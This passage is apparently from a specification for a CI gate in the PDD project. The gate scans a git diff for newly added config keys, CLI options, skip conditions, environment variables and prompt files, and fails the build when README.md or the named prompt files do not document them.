      - It parses the git diff of the worktree against `base_ref` (or HEAD/parent if `base_ref` is unresolvable) to find newly added user-facing surfaces:
        0. **Repo-declared generic contracts (holistic path)**: If `.pdd/doc_contract.json` or `.pdd/doc-contract.json` exists, load the BASE-tree version first (`<base_ref>:<path>`) and treat it as authoritative; only fall back to the worktree version when the base has no config. This prevents a reviewed PR from weakening/deleting its own documentation contract. Config shape: `{"version": 1, "rules": [...]}` where each rule has `name`, `source_globs`, `added_regex`, and `docs`/`doc_paths`. `docs` entries are either path strings or objects with `path`, optional `section_start`, and optional `section_end_markers`. Optional fields: `ignore_globs`, `ignore_values`, and `doc_regex`. For each added line in matching source files, `added_regex` captures a user-facing surface (first capture group or full match; named groups are also exposed). The docs must match `doc_regex` with placeholders such as `{value}`, `{value_dashed}`, `{operation}`, `{condition}`, `{condition_dashed}` substituted with escaped captures; when `doc_regex` is omitted, the captured `{value}` must appear literally. This is the repo-agnostic interface for arbitrary projects (e.g. `APP_*` env vars in `src/*.py` documented in `docs/configuration.md`) and MUST run before the legacy PDD-specific defaults below.
        1. **.pddrc keys**: Any added string literal within `_PDDRC_DEFAULTS_KEYS` in `pdd/construct_paths.py` (e.g., `+    "my_new_key",`).
        2. **CLI click options**: Any added click options starting with `--` (e.g., `+    @click.option("--my-option")`).
        3. **Skip behaviors AND skip contracts**: Any added operation name (`+    if operation == 'my_op':`). ADDITIONALLY, when the SAME added line gates an operation on a skip CONDITION (e.g. `+    if operation == 'fix' and skip_tests:`, or a `--skip-tests` flag), record the `(operation, condition)` contract. Recording only the operation name is insufficient — that is the #1303/#1238 drift, where a new skip condition is added to an existing, already-documented operation. Normalize the condition to its snake_case identifier (`--skip-tests` → `skip_tests`).
        4. **Environment variables**: Any added environment variable starting with `PDD_*` (e.g., `+    os.environ.get("PDD_MY_VAR")`).
        5. **Prompt story coverage (Issue #560 bridge)**: Any changed non-LLM `.prompt` file MUST be linked from at least one `user_stories/story__*.md` file through `pdd-story-prompts` metadata or an explicit prompt reference (full path, basename, or path relative to a `prompts/` segment). This does not run the LLM-backed story suite inside the deterministic gate; it enforces that the prompt-test artifact exists so `pdd detect --stories` can test prompt-level regression.
      - It MUST ignore test, fixture, snapshot, documentation, context, and example files when scanning added runtime surfaces so regression-test literals such as `--new-opt`, `new_op`, or `PDD_MY_NEW_VAR` do not make the gate fail its own PR. Environment-variable scanning is limited to runtime `.py` and `.sh` files, not prompt text.
      - It checks if each added surface is documented:
        - Added `.pddrc` keys MUST be documented in `README.md` under the "Available Context Settings" section.
        - Added Click options MUST be documented in `README.md` (e.g., option lists).
        - Added skip behaviors / sync steps MUST be documented in `README.md` (e.g., "Options" or workflow-steps lists) AND in `pdd/prompts/sync_orchestration_python.prompt` (Workflow Operations).
        - Added skip CONTRACTS (`operation` + `condition`) MUST document the CONDITION — accepting any spelling (`skip_tests`, `skip-tests`, or `--skip-tests`) — within THAT OPERATION'S OWN documented entry/block in BOTH `README.md` AND `pdd/prompts/sync_orchestration_python.prompt`, NOT merely anywhere in the file. Extract the operation's labeled entry (e.g. the `- fix: …` bullet plus its wrapped continuation lines, bounded by the next bullet/blank line/heading) and require the condition token inside it. A doc that mentions only the operation (e.g. "fix: Resolve test failures") fails; and — the #1303/#1238 round-2 drift — a doc that ties `--skip-tests` only to the `test` step while leaving `fix` documented as unconditional ALSO fails, because the condition is not tied to `fix`'s own contract.
        - Added `PDD_*` env vars MUST be documented in `README.md` under the "Environment Variables" section.
      - If any added item is not documented in the expected file/section, print detailed error messages to stdout/stderr and exit with code 1; otherwise exit with code 0.

